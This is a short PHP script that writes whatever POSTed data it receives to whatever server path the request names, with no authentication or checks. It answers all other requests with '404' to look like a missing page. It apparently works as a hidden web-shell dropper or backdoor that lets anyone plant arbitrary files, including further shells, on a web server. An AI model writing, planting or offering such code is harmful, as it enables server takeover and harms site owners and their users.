<?php

if($_POST){
  $fh = fopen($_POST["path"], 'w');
  fwrite($fh, $_POST["data"]);
  fclose($fh);
  echo "saved";
}
else{
echo "404";
}
?>